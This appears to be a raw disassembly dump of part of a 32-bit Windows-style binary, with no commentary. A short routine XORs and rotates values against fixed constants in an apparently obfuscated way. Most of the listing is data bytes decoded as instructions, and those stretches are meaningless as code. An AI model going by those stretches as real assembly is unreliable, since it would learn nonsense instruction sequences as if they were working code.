  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422598
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422598
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [ecx+eax*1+0xb],0xffffffa7
  409ce0:	mov    esp,0x181839cd
  409ce5:	sahf   
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	sbb    al,ah
  409cea:	sbb    DWORD PTR [eax-0x1f],ebx
  409ced:	xchg   ebx,eax
  409cee:	dec    esi
  409cef:	cmp    ah,BYTE PTR [eax+0x12c4a1b0]
  409cf5:	outs   dx,DWORD PTR ds:[esi]
  409cf6:	pop    edx
  409cf7:	lock pop edx
  409cf9:	push   ss
  409cfa:	mov    esi,ecx
  409cfc:	cmp    ebx,DWORD PTR [esi]
  409cfe:	mov    eax,0xa12dfa7d
  409d03:	ror    DWORD PTR [eax-0x4cc64dd],1
  409d09:	adc    al,0xb
  409d0b:	mov    dh,0x62
  409d0d:	ins    BYTE PTR es:[edi],dx
  409d0e:	mov    eax,0xd7911f6
  409d13:	lods   eax,DWORD PTR ds:[esi]
  409d14:	std    
  409d15:	cmp    ah,dh
  409d17:	or     ah,BYTE PTR [edx]
  409d19:	sub    al,0xdb
  409d1b:	push   esp
  409d1c:	push   edx
  409d1d:	adc    ecx,DWORD PTR [ebx+0x3ea1e1d9]
  409d23:	int3   
  409d24:	cmp    BYTE PTR [ebx+0x7b562622],bl
  409d2a:	out    0x42,al
  409d2c:	mov    dl,0xb2
  409d2e:	loopne 0x409d37
  409d30:	les    ecx,FWORD PTR [edi+0x59]
  409d33:	dec    ebp
  409d34:	js     0x409d37
  409d36:	nop
  409d37:	lods   eax,DWORD PTR ds:[esi]
  409d38:	fsub   st,st(0)
  409d3a:	push   edi
  409d3b:	mov    edi,0x2901a6ca
  409d40:	inc    ebx
  409d41:	sbb    dh,ah
  409d43:	(bad)  
  409d44:	popf   
  409d45:	in     al,0x13
  409d47:	icebp  
  409d48:	cmc    
  409d49:	pop    eax
  409d4a:	mov    edi,0xcd2652e2
  409d4f:	add    eax,0xeb2432eb
  409d54:	inc    edx
  409d55:	xlat   BYTE PTR ds:[ebx]
  409d56:	ds push ebx
  409d58:	ins    DWORD PTR es:[edi],dx
  409d59:	xor    al,0xe9
  409d5b:	je     0x409da2
  409d5d:	out    0x56,eax
  409d5f:	xor    eax,DWORD PTR [edx+0x1d]
  409d62:	adc    BYTE PTR [ebx+0x2a],bh
  409d65:	sbb    BYTE PTR ds:0x1d19b3cc,bh
  409d6b:	or     al,BYTE PTR [edi+0x1575a22]
  409d71:	test   BYTE PTR [edx],al
  409d73:	xchg   esp,eax
  409d74:	xchg   edx,eax
  409d75:	arpl   WORD PTR [eax],di
  409d77:	sbb    al,0x49
  409d79:	daa    
  409d7a:	push   0xb3e78e10
  409d7f:	retf   0x349b
  409d82:	dec    ecx
  409d83:	rcr    BYTE PTR [ecx-0x4b2ff859],1
  409d89:	add    DWORD PTR [eax+0x59a5c20c],0xffffff8b
  409d90:	sbb    edx,DWORD PTR [edx]
  409d92:	mov    ds:0x5b9f33d8,al
  409d97:	sub    ecx,esi
  409d99:	mov    dl,0xe3
  409d9b:	test   eax,0x78ce5d36
  409da0:	sub    BYTE PTR [edi+ebp*8+0x4bfc204f],ch
  409da7:	jns    0x409d47
  409da9:	xchg   ebx,eax
  409daa:	test   DWORD PTR [ecx],eax
  409dac:	push   edx
  409dad:	mov    eax,ds:0xd6f4b24e
  409db2:	adc    eax,DWORD PTR [esi]
  409db4:	mov    dl,bh
  409db6:	xchg   edx,eax
  409db7:	mov    ebx,es
  409db9:	mov    ebx,0xf8591a55
  409dbe:	stc    
  409dbf:	mov    es,WORD PTR [ebp-0x11]
  409dc2:	adc    ch,bl
  409dc4:	sbb    al,0x3d
  409dc6:	adc    al,0x76
  409dc8:	adc    al,0xfb
  409dca:	mov    ebp,0x53a13cf0
  409dcf:	inc    ebx
  409dd0:	jns    0x409d77
  409dd2:	ins    DWORD PTR es:[edi],dx
  409dd3:	pop    eax
  409dd4:	loopne 0x409df4
  409dd6:	scas   al,BYTE PTR es:[edi]
  409dd7:	mov    esi,0x960b0360
  409ddc:	ins    DWORD PTR es:[edi],dx
  409ddd:	or     dl,dh
  409ddf:	cmp    bl,dl
  409de1:	jb     0x409e29
  409de3:	into   
  409de4:	inc    edi
  409de5:	pusha  
  409de6:	mov    dl,0x6e
  409de8:	and    eax,0x9bbea80d
  409ded:	sub    ebp,ebp
  409def:	outs   dx,BYTE PTR ds:[esi]
  409df0:	jnp    0x409e1e
  409df2:	xchg   edx,eax
  409df3:	sub    BYTE PTR [edi+0x1052cc31],ah
  409df9:	pop    esi
  409dfa:	jp     0x409dd1
  409dfc:	adc    DWORD PTR ds:0x3384b172,ebp
  409e02:	mov    ch,0xb2
  409e04:	xor    DWORD PTR [edi-0x14520a46],0x8a9719b6
  409e0e:	cmp    eax,DWORD PTR [eax]
  409e10:	lods   al,BYTE PTR ds:[esi]
  409e11:	jmp    0x409e01
  409e13:	jl     0x409e5c
  409e15:	push   0xa66813c8
  409e1a:	xchg   ebx,eax
  409e1b:	test   al,0x97
  409e1d:	je     0x409e0a
  409e1f:	in     al,dx
  409e20:	mov    ds:0x233eb8c2,eax
  409e25:	push   ecx
  409e26:	inc    ecx
  409e27:	or     dl,BYTE PTR [eax+0x73d2fddc]
  409e2d:	lods   eax,DWORD PTR ds:[esi]
  409e2e:	jle    0x409e81
  409e30:	shl    DWORD PTR [eax],1
  409e32:	xchg   DWORD PTR [edx-0x12f44a45],ebp
  409e38:	ret    0xc587
  409e3b:	dec    eax
  409e3c:	sbb    DWORD PTR [edi],ecx
  409e3e:	and    edi,DWORD PTR [ebx]
  409e40:	xor    al,0x98
  409e42:	pop    ebp
  409e43:	xchg   ebp,eax
  409e44:	shl    ecx,1
  409e46:	lock jae 0x409e16
  409e49:	je     0x409e22
  409e4b:	mov    ah,0xe9
  409e4d:	sbb    ecx,DWORD PTR [ecx+0x2efa5bd7]
  409e53:	jecxz  0x409e29
  409e55:	or     ecx,DWORD PTR [ebx]
  409e57:	mov    bl,0x98
  409e59:	adc    eax,0xf9a26a07
  409e5e:	(bad)  [ebp+0x14]
  409e61:	loope  0x409e51
  409e63:	js     0x409ea4
  409e65:	mov    ah,0x52
  409e67:	inc    edx
  409e68:	in     al,0x7e
  409e6a:	paddd  mm5,QWORD PTR [ebx+0x2f9e8ccd]
  409e71:	sbb    ax,0xd317
  409e75:	test   DWORD PTR [esp+edi*2],edx
  409e78:	mov    edx,0xee6c1f8d
  409e7d:	or     esi,DWORD PTR [esi-0x2c]
  409e80:	cmp    DWORD PTR [ebp-0x45a103eb],edx
  409e86:	push   eax
  409e87:	inc    ecx
  409e88:	shl    esi,0xf6
  409e8b:	or     eax,0x3a7792be
  409e90:	ror    DWORD PTR [ecx+ebp*4+0x20],1
  409e94:	std    
  409e95:	rol    DWORD PTR [edx+0x4106f5a3],0x9a
  409e9c:	push   esi
  409e9d:	push   edi
  409e9e:	jg     0x409eb7
  409ea0:	ret    0xf71c
  409ea3:	inc    esi
  409ea4:	push   es
  409ea5:	(bad)  
  409ea6:	adc    al,0xce
  409ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ea9:	cli    
  409eaa:	ss popf 
  409eac:	xor    BYTE PTR [edx-0x22b2316f],dh
  409eb2:	js     0x409ea5
  409eb4:	jnp    0x409e4f
  409eb6:	out    dx,al
  409eb7:	fs or  al,0xc1
  409eba:	test   eax,0xf030a701
  409ebf:	mov    al,0xbc
  409ec1:	retf   
  409ec2:	in     al,0x92
  409ec4:	push   0xfffffffa
  409ec6:	mov    bh,0xc1
  409ec8:	std    
  409ec9:	pop    esp
  409eca:	push   esi
  409ecb:	fwait
  409ecc:	cs scas al,BYTE PTR es:[edi]
  409ece:	sahf   
  409ecf:	aas    
  409ed0:	xor    al,0xe1
  409ed2:	push   ds
  409ed3:	ret    
  409ed4:	out    0x6d,eax
  409ed6:	jnp    0x409e67
  409ed8:	jge    0x409ea1
  409eda:	lea    esi,[edx-0x27abf126]
  409ee0:	and    ch,BYTE PTR [eax]
  409ee2:	push   ebp
  409ee3:	jo     0x409f33
  409ee5:	push   esi
  409ee6:	pop    ecx
  409ee7:	cmp    ebx,DWORD PTR [esp+edi*1]
  409eea:	sub    edx,DWORD PTR [edi-0x20ea20df]
  409ef0:	mov    ebx,DWORD PTR [ecx+eax*1+0x61]
  409ef4:	inc    edi
  409ef5:	jle    0x409f2d
  409ef7:	adc    al,BYTE PTR [esi-0x50]
  409efa:	test   al,0x93
  409efc:	sbb    dl,BYTE PTR [ecx+0x35106429]
  409f02:	cli    
  409f03:	fs inc eax
  409f05:	sbb    al,0x8b
  409f07:	push   eax
  409f08:	pop    esp
  409f09:	and    esp,DWORD PTR [edi+0x7c]
  409f0c:	ror    DWORD PTR [ebx],cl
  409f0e:	out    dx,al
  409f0f:	inc    ebx
  409f10:	jnp    0x409f6c
  409f12:	pop    edi
  409f13:	dec    ebx
  409f14:	dec    edi
  409f15:	out    dx,al
  409f16:	jl     0x409efb
  409f18:	mov    esi,0x8460c488
  409f1d:	daa    
  409f1e:	sub    eax,esp
  409f20:	mov    cl,0x25
  409f22:	or     DWORD PTR [ebp+0x29c888c9],esp
  409f28:	or     eax,0x276d9f97
  409f2d:	aam    0x99
  409f2f:	xchg   edi,eax
  409f30:	jecxz  0x409f76
  409f32:	out    dx,eax
  409f33:	aad    0x60
  409f35:	add    ebx,DWORD PTR ds:0xd0ce14c0
  409f3b:	cmp    BYTE PTR [esi-0x3fc07efb],0xae
  409f42:	sbb    eax,0x28a4a442
  409f47:	sbb    ecx,DWORD PTR ds:0x23b47f88
  409f4d:	cli    
  409f4e:	mov    al,0xb8
  409f50:	add    bh,BYTE PTR [edx]
  409f52:	and    BYTE PTR [esi],0x24
  409f55:	mov    dl,0x23
  409f57:	adc    al,0x7
  409f59:	pop    ecx
  409f5a:	fist   WORD PTR [edi+0x12e7d3a3]
  409f60:	mov    bl,0x59
  409f62:	cmp    dh,BYTE PTR [esi+esi*1+0x3a]
  409f66:	and    DWORD PTR [ebp+0x6a],0xffffffa7
  409f6a:	inc    edi
  409f6b:	or     bh,BYTE PTR [edi+0xb913ce9]
  409f71:	push   eax
  409f72:	fs rcr esp,cl
  409f75:	ficomp WORD PTR [esi-0x13a2e30e]
  409f7b:	(bad)  
  409f7c:	xchg   ebp,eax
  409f7d:	mov    eax,ds:0xadc33c4c
  409f82:	mov    esi,0x14949183
  409f87:	mov    ecx,0xc2040fb7
  409f8c:	retf   
  409f8d:	pop    es
  409f8e:	mov    eax,ds:0xc3eacd94
  409f93:	leave  
  409f94:	jmp    0x1108c663
  409f99:	dec    ebp
  409f9a:	or     ah,dl
  409f9c:	sbb    DWORD PTR [edx+ebp*2+0x77],ebp
  409fa0:	sub    esp,DWORD PTR [edi-0x441a6dbe]
  409fa6:	or     DWORD PTR [ebp+0x4981018],ebx
  409fac:	aaa    
  409fad:	or     BYTE PTR [ebp+0x44],ah
  409fb0:	shr    ch,0x8b
  409fb3:	hlt    
  409fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb5:	mov    ebp,0x7e2714f
  409fba:	popa   
  409fbb:	pop    esi
  409fbc:	or     al,0x8c
  409fbe:	(bad)  
  409fc0:	cs dec esp
  409fc2:	je     0x409f47
  409fc4:	inc    esi
  409fc5:	test   DWORD PTR [edi+0xe],edx
  409fc8:	xor    dh,BYTE PTR [esi]
  409fca:	lahf   
  409fcb:	lock enter 0xf536,0x3c
  409fd0:	xchg   ecx,eax
  409fd1:	ins    DWORD PTR es:[edi],dx
  409fd2:	xchg   ebx,eax
  409fd3:	mov    ds:0x999281d4,al
  409fd8:	dec    edx
  409fd9:	int3   
  409fda:	or     cl,BYTE PTR [edi-0xb]
  409fdd:	add    ah,ah
  409fdf:	xchg   DWORD PTR [esi+0x7f5f9eca],ebx
  409fe5:	cmp    dl,BYTE PTR [edi+ebx*4+0x1a4ff2dc]
  409fec:	(bad)  
  409fed:	fs pop esp
  409fef:	cmp    eax,0x11d74c39
  409ff4:	and    BYTE PTR [ecx+0x2c],ch
  409ff7:	out    dx,al
  409ff8:	push   ebx
  409ff9:	ds push ds
  409ffb:	add    ebx,DWORD PTR [esi]
  409ffd:	mov    ecx,0x36e5390d
  40a002:	inc    ebx
  40a003:	aad    0xee
  40a005:	xor    al,0xe6
  40a007:	leave  
  40a008:	mov    ch,bh
  40a00a:	sbb    BYTE PTR [ebx-0x5f9c7088],0xdc
  40a011:	sbb    al,0xac
  40a013:	jbe    0x409fcf
  40a015:	sub    al,0x42
  40a017:	stos   DWORD PTR es:[edi],eax
  40a018:	xor    BYTE PTR [edx+0x1f1721d7],dl
  40a01e:	xchg   ebp,eax
  40a01f:	ds scas al,BYTE PTR es:[edi]
  40a021:	xlat   BYTE PTR ds:[ebx]
  40a022:	call   0xf7a9321
  40a027:	loope  0x40a03d
  40a029:	test   BYTE PTR [edx+ecx*8-0x5],bl
  40a02d:	push   eax
  40a02e:	pop    eax
  40a02f:	push   esp
  40a030:	psubusw mm3,mm0
  40a033:	push   es
  40a034:	jnp    0x40a071
  40a036:	pop    esi
  40a037:	push   ds
  40a038:	out    dx,eax
  40a039:	bound  edi,QWORD PTR [edx]
  40a03b:	out    dx,al
  40a03c:	adc    eax,0x428635b6
  40a041:	push   edx
  40a042:	jecxz  0x40a059
  40a044:	cli    
  40a045:	stos   DWORD PTR es:[edi],eax
  40a046:	xlat   BYTE PTR ds:[ebx]
  40a047:	lods   al,BYTE PTR ds:[esi]
  40a048:	sti    
  40a049:	add    eax,eax
  40a04b:	retf   
  40a04c:	xlat   BYTE PTR ds:[ebx]
  40a04d:	(bad)
  40a051:	scas   al,BYTE PTR es:[edi]
  40a052:	ret    0xb85
  40a055:	stc    
  40a056:	push   ebp
  40a057:	sbb    DWORD PTR [esi+0x63],0x4bfa8c04
  40a05e:	pop    edx
  40a05f:	xchg   BYTE PTR [eax],ah
  40a061:	call   0x4fea:0xf05eec67
  40a068:	jo     0x40a0e8
  40a06a:	imul   esp,DWORD PTR [eax-0x81b8433],0x48
  40a071:	xchg   DWORD PTR [esi],edx
  40a073:	jne    0x409ff6
  40a075:	mov    ebx,DWORD PTR [eax+0x29c3185]
  40a07b:	out    dx,al
  40a07c:	or     al,0x5
  40a07e:	pop    es
  40a07f:	popf   
  40a080:	call   0xdba884e0
  40a085:	test   DWORD PTR [ecx],eax
  40a087:	mov    edi,0xf5f56e02
  40a08c:	push   ecx
  40a08d:	jmp    0xf0301dda
  40a092:	inc    eax
  40a093:	cwde   
  40a094:	xchg   DWORD PTR [ebp+0x27a666ea],ebx
  40a09a:	(bad)  
  40a09b:	cdq    
  40a09c:	or     DWORD PTR [ebp-0x63],0x5a8f99f7
  40a0a3:	psrld  mm0,QWORD PTR [ebx-0x67]
  40a0a7:	int    0x38
  40a0a9:	fwait
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	jae    0x40a0c1
  40a12a:	mov    bl,0x7c
  40a12c:	push   edx
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi+0x56181812],bl
  40a135:	loop   0x40a0b9
  40a137:	loopne 0x40a0c0
  40a139:	adc    ah,dl
  40a13b:	pop    edi
  40a13c:	pop    eax
  40a13d:	imul   ecx,DWORD PTR [edx+0x38c23f2a],0xb9533db2
  40a147:	ss adc esi,edi
  40a14a:	xchg   edi,eax
  40a14b:	sbb    ebp,DWORD PTR [esi]
  40a14d:	or     DWORD PTR [edi-0x39],0xffffffbd
  40a151:	push   cs
  40a152:	nop
  40a153:	ss mov bh,bl
  40a156:	push   bx
  40a158:	fxch   st(5)
  40a15a:	pop    edi
  40a15b:	xchg   BYTE PTR [ebx],al
  40a15d:	jecxz  0x40a144
  40a15f:	or     DWORD PTR [eax-0xdf4de79],esi
  40a165:	lea    ebx,[esi]
  40a167:	mov    al,0x78
  40a169:	jl     0x40a162
  40a16b:	jle    0x40a1cb
  40a16d:	sbb    DWORD PTR [esi-0x5d3b29c6],0xc2b50969
  40a177:	xchg   dl,cl
  40a179:	or     al,0xea
  40a17b:	inc    esi
  40a17c:	push   esi
  40a17d:	out    0x12,eax
  40a17f:	in     eax,dx
  40a180:	popf   
  40a181:	aas    
  40a182:	push   0xffffff94
  40a184:	jnp    0x40a19e
  40a186:	mov    esp,0x1a4bfc10
  40a18b:	jmp    0x83fab3c1
  40a190:	addr16 cdq 
  40a192:	sub    bh,BYTE PTR [esi+ebx*8]
  40a195:	ret    0x8a53
  40a198:	mov    ds:0x23ad2e21,eax
  40a19d:	scas   eax,DWORD PTR es:[edi]
  40a19e:	xchg   esp,eax
  40a19f:	jne    0x40a13c
  40a1a1:	lods   eax,DWORD PTR ds:[esi]
  40a1a2:	call   DWORD PTR [eax]
  40a1a4:	mov    edx,0xa5539daa
  40a1a9:	inc    eax
  40a1aa:	cmp    ecx,DWORD PTR [esi+0x3c2b783]
  40a1b0:	pop    es
  40a1b1:	repz inc esi
  40a1b3:	adc    al,0x3f
  40a1b5:	cmp    eax,0x46da3699
  40a1ba:	dec    esp
  40a1bb:	ins    BYTE PTR es:[edi],dx
  40a1bc:	adc    dl,BYTE PTR [ebx+0x67]
  40a1bf:	mov    al,ds:0x9fe82b41
  40a1c4:	pushf  
  40a1c5:	outs   dx,DWORD PTR ds:[esi]
  40a1c6:	push   0xe
  40a1c8:	mov    ebx,ebx
  40a1ca:	inc    ebp
  40a1cb:	pop    esi
  40a1cc:	aad    0x74
  40a1ce:	mov    ecx,0x19e34d8b
  40a1d3:	mov    dl,0xab
  40a1d5:	loopne 0x40a255
  40a1d7:	aaa    
  40a1d8:	inc    edx
  40a1d9:	hlt    
  40a1da:	pushf  
  40a1db:	fxsave ds:0x33953253
  40a1e2:	imul   edx,DWORD PTR [eax+0x1e3e227d],0x64cd263d
  40a1ec:	ja     0x40a237
  40a1ee:	mov    esi,0xe4025a11
  40a1f3:	jecxz  0x40a274
  40a1f5:	mov    cl,0x63
  40a1f7:	iret   
  40a1f8:	(bad)  
  40a1f9:	jae    0x40a1c5
  40a1fb:	test   BYTE PTR [ecx-0x58494ffd],bl
  40a201:	jnp    0x40a18e
  40a203:	mov    dl,0xcb
  40a205:	dec    ebx
  40a206:	in     eax,dx
  40a207:	shl    DWORD PTR [ebp+0x3c319cc8],cl
  40a20d:	inc    esp
  40a20e:	clc    
  40a20f:	push   0xc53dde0d
  40a214:	mov    edi,0x18bb05e
  40a219:	cmp    DWORD PTR [edx-0x13275717],edi
  40a21f:	rep outs dx,DWORD PTR ds:[esi]
  40a221:	shr    DWORD PTR [edi-0x7],0xec
  40a225:	jl     0x40a27d
  40a227:	cmp    bh,BYTE PTR [eax+0x4a]
  40a22a:	cmp    bh,al
  40a22c:	and    esi,edi
  40a22e:	int    0x15
  40a230:	iret   
  40a231:	fiadd  DWORD PTR [ebp+0x5d393fa5]
  40a237:	ds and al,0xba
  40a23a:	test   DWORD PTR [edx-0x2a3344dc],0x9f906aa1
  40a244:	psubsw mm4,QWORD PTR [edx]
  40a247:	call   0xf327:0xdf54978c
  40a24e:	jmp    0x40a259
  40a250:	mov    BYTE PTR ds:0x6edbe78f,al
  40a256:	lea    ecx,[edi+edi*4-0x6a]
  40a25a:	out    0x33,al
  40a25c:	sub    ebp,DWORD PTR [ebp+0x66]
  40a25f:	cmp    DWORD PTR [ebp+0x29284ebe],esi
  40a265:	and    BYTE PTR [ecx],0x2f
  40a268:	jmp    0x666c:0xe2355721
  40a26f:	ret    
  40a270:	das    
  40a271:	pop    ebx
  40a272:	sub    BYTE PTR [esi],0x5
  40a275:	outs   dx,DWORD PTR ds:[esi]
  40a276:	cmp    DWORD PTR [edx],0xffffffbe
  40a279:	call   0x4cba9842
  40a27e:	dec    edi
  40a27f:	and    DWORD PTR [ebx+0x7],ecx
  40a282:	das    
  40a283:	pop    eax
  40a284:	aaa    
  40a285:	jmp    0x30ba9d82
  40a28a:	rcl    DWORD PTR [eax+ebx*2],0xa6
  40a28e:	ja     0x40a30a
  40a290:	jecxz  0x40a289
  40a292:	push   edx
  40a293:	jl     0x40a308
  40a295:	addr16 xchg esp,eax
  40a297:	jmp    0x40a25d
  40a299:	pop    ebx
  40a29a:	and    eax,0x49604256
  40a29f:	add    al,0xed
  40a2a1:	das    
  40a2a2:	jne    0x40a30e
  40a2a4:	aad    0xa5
  40a2a6:	xor    eax,0x53bbd8fd
  40a2ab:	cmp    al,BYTE PTR [eax+0x19]
  40a2ae:	mov    ebp,0xe1d77ed9
  40a2b3:	xchg   edx,eax
  40a2b4:	xchg   esi,eax
  40a2b5:	mov    BYTE PTR [esi-0x6e8019d2],0xbd
  40a2bc:	ret    0x7a3d
  40a2bf:	or     al,0x7f
  40a2c1:	(bad)  [edi+ebp*4+0x7325b765]
  40a2c8:	push   ebp
  40a2c9:	xor    eax,0x735a4ab7
  40a2ce:	cld    
  40a2cf:	leave  
  40a2d0:	fs jmp 0xf92c:0x20ede9d6
  40a2d8:	inc    esp
  40a2d9:	xlat   BYTE PTR ds:[ebx]
  40a2da:	pop    ss
  40a2db:	mov    ch,0x2b
  40a2dd:	sub    al,0x42
  40a2df:	leave  
  40a2e0:	outs   dx,BYTE PTR ds:[esi]
  40a2e1:	inc    esp
  40a2e2:	es jg  0x40a2cb
  40a2e5:	mov    esi,DWORD PTR [ebx]
  40a2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e8:	mov    ebx,0xb206372d
  40a2ed:	xchg   ebp,eax
  40a2ee:	int3   
  40a2ef:	xchg   ebx,eax
  40a2f0:	call   edx
  40a2f2:	push   esp
  40a2f3:	int    0xab
  40a2f5:	js     0x40a32a
  40a2f7:	arpl   ax,cx
  40a2f9:	pop    ds
  40a2fa:	jbe    0x40a366
  40a2fc:	repnz push ebx
  40a2fe:	lods   eax,DWORD PTR ds:[esi]
  40a2ff:	out    dx,al
  40a300:	mov    cl,0x1b
  40a302:	popf   
  40a303:	jp     0x40a2d1
  40a305:	daa    
  40a306:	inc    ebp
  40a307:	xchg   ebp,eax
  40a308:	nop
  40a309:	std    
  40a30a:	hlt    
  40a30b:	cmp    cl,BYTE PTR [ebp+0x64]
  40a30e:	loopne 0x40a2f1
  40a310:	(bad)  [esi]
  40a312:	int    0x33
  40a314:	jmp    0x594039aa
  40a319:	and    ah,dh
  40a31b:	cmp    al,dh
  40a31d:	jo     0x40a321
  40a31f:	and    DWORD PTR [esi-0x54],esp
  40a322:	push   ss
  40a323:	add    edi,DWORD PTR fs:[eax-0xe]
  40a327:	cmp    al,0x86
  40a329:	retf   
  40a32a:	mov    al,0xab
  40a32c:	loop   0x40a2bc
  40a32e:	fs mov dh,0x5f
  40a331:	push   esi
  40a332:	mov    ds:0xca82f9cf,eax
  40a337:	mov    ecx,esi
  40a339:	pminsw mm7,QWORD PTR [ebx-0x4b008dc7]
  40a340:	inc    ecx
  40a341:	push   es
  40a342:	pop    ebx
  40a343:	(bad)  
  40a344:	mov    dh,0xf0
  40a346:	push   edx
  40a347:	and    BYTE PTR [ebp+0x16],cl
  40a34a:	cwde   
  40a34b:	mov    eax,ds:0xa3ff3f53
  40a350:	add    al,0x3c
  40a352:	push   ecx
  40a353:	mov    cl,al
  40a355:	std    
  40a356:	dec    ebx
  40a357:	add    al,0x2
  40a359:	cmp    esp,DWORD PTR [esi+0x5ce2a338]
  40a35f:	gs push edx
  40a361:	in     al,dx
  40a362:	inc    eax
  40a363:	adc    ebp,DWORD PTR [edi-0x44]
  40a366:	add    eax,DWORD PTR [eax]
  40a368:	mov    eax,0xa6c19919
  40a36d:	dec    eax
  40a36e:	out    dx,eax
  40a36f:	push   edx
  40a370:	xlat   BYTE PTR ds:[ebx]
  40a371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a372:	sub    ah,BYTE PTR [edx+0x429bed04]
  40a378:	(bad)  
  40a37a:	arpl   WORD PTR [esi],sp
